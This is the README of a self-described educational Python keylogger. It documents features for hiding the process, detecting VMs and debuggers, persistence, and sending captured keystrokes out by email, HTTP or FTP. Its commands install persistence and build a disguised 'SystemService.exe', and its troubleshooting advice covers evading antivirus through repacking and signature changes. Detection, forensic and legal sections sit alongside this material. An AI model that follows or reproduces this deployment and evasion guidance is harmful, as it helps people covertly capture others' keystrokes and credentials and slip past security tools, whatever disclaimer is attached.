# Educational Keylogger Project

[![Education](https://img.shields.io/badge/Purpose-Educational-green.svg)](https://github.com/educational)
[![License](https://img.shields.io/badge/License-Educational%20Only-red.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Cross--Platform-lightgrey.svg)](README.md)

## ⚠️ LEGAL DISCLAIMER ⚠️

**THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY**

This keylogger is developed strictly for:
- **Educational learning** about cybersecurity concepts
- **Authorized penetration testing** on systems you own
- **Security research** in controlled environments
- **Understanding** how keyloggers work for defensive purposes

### 🚨 IMPORTANT WARNINGS:

- **NEVER** use this software on systems you don't own
- **NEVER** use this without explicit written permission
- Using keyloggers on others' systems **WITHOUT CONSENT IS ILLEGAL**
- This software is provided **AS IS** without warranty
- The author is **NOT RESPONSIBLE** for misuse of this code
- By using this software, you agree to comply with all applicable laws

---

## 📋 Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Usage](#usage)
5. [Building Executable](#building-executable)
6. [Educational Value](#educational-value)
7. [Detection Methods](#detection-methods)
8. [Defensive Measures](#defensive-measures)
9. [Legal Considerations](#legal-considerations)
10. [Contributing](#contributing)
11. [Support](#support)

---

## 🚀 Features

### Core Functionality
- ✅ **Cross-platform keylogging** (Windows, Linux, macOS)
- ✅ **Real-time keystroke capture** with timestamps
- ✅ **Special key handling** (Space, Enter, Backspace, etc.)
- ✅ **Window title and application tracking**
- ✅ **Configurable logging intervals**

### Security Features
- 🔐 **AES-256 encryption** for log files
- 🗜️ **Gzip compression** for efficient storage
- 🔑 **Password-based key derivation** (PBKDF2)
- 📊 **Integrity checking** with SHA-256 checksums
- 🗃️ **SQLite database** for structured logging

### Stealth Capabilities
- 👻 **Hidden console window** (Windows)
- 🎭 **Process name obfuscation**
- 📁 **Decoy file creation**
- 🔍 **VM and debugger detection**
- ⚡ **Anti-analysis features**
- 🛡️ **Self-destruct mechanisms**

### Persistence Mechanisms
- 🔄 **Automatic startup** configuration
- 🏃 **Auto-restart** functionality
- 👀 **Watchdog process** monitoring
- 🖥️ **System service** integration
- 📋 **Registry/autostart** entries

### Data Transmission
- 📧 **Email reporting** with SMTP
- 🌐 **HTTP POST** to remote servers
- 📂 **FTP upload** capability
- ⏰ **Scheduled transmission**
- 🗑️ **Automatic cleanup** after sending

### Advanced Features
- ⚙️ **JSON configuration** system
- 📈 **Real-time monitoring** dashboard
- 🧹 **Automatic log cleanup**
- 💾 **Database backup** system
- 🚨 **Emergency stop** mechanism
- 📊 **Usage statistics** tracking

---

## 🔧 Installation

### Prerequisites

1. **Python 3.7 or higher**
2. **pip package manager**
3. **Administrative privileges** (for some features)

### Step 1: Clone Repository

```bash
git clone https://github.com/your-repo/educational-keylogger.git
cd educational-keylogger
```

### Step 2: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 3: Verify Installation

```bash
python keylogger.py --help
```

---

## ⚙️ Configuration

The keylogger is configured through the `config.json` file. Here are the main sections:

### Basic Configuration

```json
{
    \"general\": {
        \"debug_mode\": false,
        \"log_level\": \"INFO\",
        \"process_name\": \"System Configuration Manager\"
    },
    \"keylogger\": {
        \"enabled\": true,
        \"buffer_size\": 100,
        \"flush_interval_minutes\": 5,
        \"log_special_keys\": true,
        \"log_timestamps\": true
    }
}
```

### Encryption Settings

```json
{
    \"encryption\": {
        \"enabled\": true,
        \"password\": \"your_secure_password_here\",
        \"compress_logs\": true
    }
}
```

### Email Reporting

```json
{
    \"email\": {
        \"enabled\": false,
        \"smtp_server\": \"smtp.gmail.com\",
        \"smtp_port\": 587,
        \"sender_email\": \"your-email@example.com\",
        \"sender_password\": \"your-app-password\",
        \"recipient_email\": \"recipient@example.com\"
    }
}
```

### Stealth Options

```json
{
    \"stealth\": {
        \"hide_console\": true,
        \"process_name_obfuscation\": true,
        \"vm_detection\": true,
        \"anti_debug\": true
    }
}
```

---

## 🎮 Usage

### Basic Usage

```bash
# Run with default settings
python keylogger.py

# Run with custom config
python keylogger.py --config my_config.json

# Run in debug mode
python keylogger.py --debug

# Show help
python keylogger.py --help
```

### Configuration Management

```bash
# Test configuration
python config_manager.py

# Export current config
python config_manager.py --export config_backup.json

# Import configuration
python config_manager.py --import new_config.json

# Reset to defaults
python config_manager.py --reset
```

### Log Management

```bash
# View log statistics
python log_manager.py --stats

# Export logs to different formats
python log_manager.py --export --format json
python log_manager.py --export --format csv
python log_manager.py --export --format html

# Decrypt and view logs
python log_manager.py --decrypt --password your_password
```

### Stealth Testing

```bash
# Test stealth features
python stealth_manager.py

# Check VM environment
python stealth_manager.py --check-vm

# Test anti-debug features
python stealth_manager.py --check-debug
```

### Persistence Management

```bash
# Setup persistence
python persistence_manager.py --install

# Remove persistence
python persistence_manager.py --uninstall

# Check persistence status
python persistence_manager.py --status
```

---

## 🏗️ Building Executable

### Using the Build Script

```bash
# Build standalone executable
python build.py

# Build with custom options
python build.py --no-stealth --debug

# Create portable package
python build.py --portable
```

### Manual PyInstaller Build

```bash
# One-file executable (recommended)
pyinstaller --onefile --windowed keylogger.py

# Directory build (faster startup)
pyinstaller --windowed keylogger.py

# With custom icon and version info
pyinstaller --onefile --windowed --icon=icon.ico --version-file=version.txt keylogger.py
```

### Build Outputs

After building, you'll find:
- `dist/SystemService.exe` - Main executable (Windows)
- `dist/system-service` - Main executable (Linux/macOS)
- `portable_keylogger/` - Complete portable package

---

## 🎓 Educational Value

This project demonstrates several important cybersecurity concepts:

### 1. **Keylogger Mechanics**
- How keystrokes are captured at the system level
- Input event handling and processing
- Cross-platform compatibility challenges

### 2. **Stealth Techniques**
- Process hiding and name obfuscation
- Anti-detection mechanisms
- VM and debugger evasion
- File system manipulation

### 3. **Data Security**
- Encryption algorithms (AES, Fernet)
- Key derivation functions (PBKDF2)
- Data integrity verification
- Secure transmission protocols

### 4. **System Persistence**
- Startup mechanisms across operating systems
- Service and daemon creation
- Registry and autostart manipulation
- Process monitoring and recovery

### 5. **Network Communication**
- SMTP email transmission
- HTTP REST API communication
- FTP file transfer
- Error handling and retry logic

---

## 🕵️ Detection Methods

Understanding detection helps build better defenses:

### 1. **Behavioral Detection**
- Unusual network traffic patterns
- Suspicious file system activity
- Process behavior analysis
- Memory usage patterns

### 2. **Signature Detection**
- Known file hashes
- String patterns in binaries
- Registry key signatures
- Network protocol signatures

### 3. **Heuristic Detection**
- Keystroke capture API usage
- Encryption library usage
- Startup persistence patterns
- Anti-analysis behavior

### 4. **System Monitoring**
```bash
# Monitor process activity (Linux)
sudo strace -p <process_id>

# Check network connections
netstat -an | grep ESTABLISHED

# Monitor file system activity
sudo lsof -p <process_id>

# Check startup entries (Windows)
msconfig
```

---

## 🛡️ Defensive Measures

### For System Administrators

1. **Endpoint Protection**
   - Deploy comprehensive antivirus solutions
   - Use behavior-based detection systems
   - Implement application whitelisting
   - Regular system integrity checks

2. **Network Monitoring**
   - Monitor outbound traffic patterns
   - Implement data loss prevention (DLP)
   - Use network segmentation
   - Deploy intrusion detection systems (IDS)

3. **Access Controls**
   - Implement least privilege principles
   - Use strong authentication mechanisms
   - Regular access reviews
   - Privilege escalation monitoring

4. **System Hardening**
   - Disable unnecessary services
   - Regular security updates
   - Secure configuration management
   - Process monitoring and logging

### For Users

1. **Security Awareness**
   - Recognize phishing attempts
   - Verify software sources
   - Regular password changes
   - Use two-factor authentication

2. **System Hygiene**
   - Regular malware scans
   - Keep software updated
   - Use standard user accounts
   - Monitor system behavior

---

## ⚖️ Legal Considerations

### United States
- **Computer Fraud and Abuse Act (CFAA)**
- **Wiretap Act**
- **State privacy laws**
- **Workplace monitoring regulations**

### European Union
- **General Data Protection Regulation (GDPR)**
- **ePrivacy Directive**
- **National cybercrime laws**
- **Workplace surveillance regulations**

### Other Jurisdictions
- Research local cybercrime laws
- Understand privacy regulations
- Check workplace monitoring rules
- Consider data retention requirements

### Best Practices
1. **Always obtain written permission**
2. **Document legitimate purposes**
3. **Implement data minimization**
4. **Ensure secure data handling**
5. **Provide clear notifications**
6. **Maintain audit trails**

---

## 🧪 Testing Environment Setup

### Virtual Machine Setup

#### VirtualBox Configuration
```bash
# Create isolated network
VBoxManage natnetwork add --netname testing --network "192.168.100.0/24" --enable

# Create VM with isolated network
VBoxManage createvm --name "Testing-VM" --register
VBoxManage modifyvm "Testing-VM" --memory 2048 --cpus 2
VBoxManage modifyvm "Testing-VM" --nic1 natnetwork --nat-network1 testing
```

#### VMware Configuration
```bash
# Use host-only network adapter
# Disable shared folders
# Use snapshot for easy restoration
```

### Safe Testing Practices

1. **Isolated Environment**
   - Use dedicated test systems
   - Disable network connectivity
   - Use VM snapshots
   - Separate test networks

2. **Data Protection**
   - No real personal data
   - Use test accounts only
   - Mock sensitive information
   - Secure test data disposal

3. **Documentation**
   - Log all testing activities
   - Record configuration changes
   - Document findings
   - Maintain chain of custody

---

## 🔍 Forensic Analysis

### Artifact Location

#### Windows
```
Registry Keys:
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

Files:
%APPDATA%\\SystemConfiguration\\
%TEMP%\\keylog*
%USERPROFILE%\\Documents\\keylog*

Event Logs:
Windows Logs\\Application
Windows Logs\\System
Applications and Services Logs\\Microsoft\\Windows\\PowerShell\\Operational
```

#### Linux
```bash
# Check autostart entries
ls ~/.config/autostart/
ls /etc/xdg/autostart/

# Check systemd services
systemctl --user list-unit-files
ls ~/.config/systemd/user/

# Check cron jobs
crontab -l
ls /etc/cron.d/

# Check hidden files
find $HOME -name ".*keylog*" -type f 2>/dev/null
```

#### macOS
```bash
# LaunchAgents
ls ~/Library/LaunchAgents/
ls /Library/LaunchAgents/
ls /System/Library/LaunchAgents/

# Application Support
ls ~/Library/Application\\ Support/SystemConfiguration/

# Preferences
ls ~/Library/Preferences/com.systemconfiguration*
```

### Memory Analysis

```bash
# Create memory dump (Linux)
sudo dd if=/dev/mem of=memory_dump.img

# Volatility analysis
volatility -f memory_dump.img --profile=LinuxUbuntu1804x64 linux_pslist
volatility -f memory_dump.img --profile=LinuxUbuntu1804x64 linux_netstat
volatility -f memory_dump.img --profile=LinuxUbuntu1804x64 linux_keyboard_notifiers
```

---

## 🛠️ Development

### Project Structure

```
educational-keylogger/
├── keylogger.py              # Main keylogger application
├── config_manager.py         # Configuration management
├── log_manager.py            # Log file handling and encryption
├── stealth_manager.py        # Stealth and evasion features
├── persistence_manager.py    # Startup persistence handling
├── build.py                  # Executable building script
├── config.json               # Default configuration
├── requirements.txt          # Python dependencies
├── README.md                 # This documentation
├── tests/                    # Unit tests
│   ├── test_keylogger.py
│   ├── test_config.py
│   └── test_stealth.py
├── docs/                     # Additional documentation
│   ├── LEGAL.md
│   ├── DETECTION.md
│   └── FORENSICS.md
└── examples/                 # Usage examples
    ├── basic_usage.py
    ├── custom_config.py
    └── analysis_tools.py
```

### Contributing

1. **Fork the repository**
2. **Create a feature branch**
3. **Write tests for new features**
4. **Ensure code follows PEP 8**
5. **Update documentation**
6. **Submit a pull request**

### Code Standards

```bash
# Format code
black *.py

# Check style
flake8 *.py

# Run tests
pytest tests/

# Type checking
mypy *.py
```

---

## 🆘 Troubleshooting

### Common Issues

#### Permission Denied Errors
```bash
# Linux: Add user to input group
sudo usermod -a -G input $USER

# Run with appropriate permissions
sudo python keylogger.py
```

#### Antivirus Detection
- Add exception for project directory
- Use different packing methods
- Modify code signatures
- Test in isolated environment

#### Network Transmission Failures
```python
# Debug email settings
import smtplib
server = smtplib.SMTP('smtp.gmail.com', 587)
server.set_debuglevel(1)  # Enable verbose output
```

#### Build Failures
```bash
# Clear build cache
rm -rf build/ dist/ __pycache__/

# Reinstall PyInstaller
pip uninstall pyinstaller
pip install --upgrade pyinstaller

# Try different build options
python build.py --no-optimize --no-upx
```

### Debug Mode

Enable debug mode for detailed logging:
```json
{
    \"general\": {
        \"debug_mode\": true,
        \"log_level\": \"DEBUG\"
    }
}
```

---

## 📚 Additional Resources

### Educational Materials
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [SANS Security Awareness](https://www.sans.org/security-awareness-training/)

### Legal Resources
- [EFF Digital Rights](https://www.eff.org/)
- [Computer Crime Laws by State](https://www.ncsl.org/research/telecommunications-and-information-technology/computer-crime-statutes.aspx)
- [GDPR Compliance Guide](https://gdpr.eu/)

### Technical References
- [Python pynput Documentation](https://pynput.readthedocs.io/)
- [Cryptography Library Docs](https://cryptography.io/)
- [PyInstaller Manual](https://pyinstaller.readthedocs.io/)

---

## 📞 Support and Contact

### Reporting Issues
- **Security vulnerabilities**: Use responsible disclosure
- **Bug reports**: Create detailed GitHub issues
- **Feature requests**: Open GitHub discussions
- **General questions**: Check documentation first

### Educational Use
- This project is intended for **educational purposes only**
- Use in **controlled environments** with proper authorization
- **Respect privacy** and legal boundaries
- **Contribute** to cybersecurity education

---

## 📄 License and Disclaimer

### Educational License

This software is provided for educational purposes only. By using this software, you agree to:

1. **Use only in authorized environments**
2. **Comply with all applicable laws**
3. **Respect privacy and consent requirements**
4. **Not use for malicious purposes**
5. **Accept all responsibility for your actions**

### Disclaimer

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## 🏆 Acknowledgments

- **Python Software Foundation** for the Python programming language
- **pynput developers** for cross-platform input handling
- **Cryptography library** maintainers for encryption capabilities
- **Cybersecurity community** for educational resources and ethical guidelines
- **All contributors** who help improve this educational project

---

**Remember: With great power comes great responsibility. Use this knowledge to defend, not to attack.**

---

*Last updated: [Date]*
*Version: 1.0.0*
*For educational use only*